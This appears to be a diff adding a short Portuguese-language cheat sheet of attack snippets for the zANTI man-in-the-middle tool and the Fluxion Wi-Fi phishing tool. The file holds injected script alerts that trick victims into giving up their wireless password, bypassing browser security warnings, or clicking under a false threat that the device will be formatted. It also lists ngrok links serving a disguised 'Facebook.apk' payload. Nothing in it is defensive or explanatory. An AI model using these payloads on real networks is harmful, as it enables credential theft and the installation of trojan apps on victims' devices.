@@ -1,0 +1,25 @@
+
+
+
+ZANTI HTML PARA FLUXION
+
+<script>alert("Ops, estamos tentando resolver problemas com sua conexão, para agilizar este processo, vá até seu navegador e entre com sua SENHA Wireless")</script>
+
+<script>alert("Para continuar navegando normalmente Click em Continuar mesmo assim>Avançado")</script>
+
+<script>alert("Atenção, se estiver enfrentando problemas de conexão com a internet, click neste link")</script>
+
+ZANTI PARA REDIRECIONAMENTO NGROK / PAYLOAD BAIXAR VIA APACHE2 
+
+
+https://.ngrok.io/Facebook.apk
+
+
+ZANTI HTML PARA PAYLOADS
+
+<script>alert("Atenção, o google está preocupada com sua segurança, portanto aconselhamos que você click em OK para não FORMATAR seu dispositivo, caso click em CANCELAR o dispositivo será FORMATADO")</script>
+
+
+
+
+https://72bdfe33.ngrok.io:443/Facebook.apk
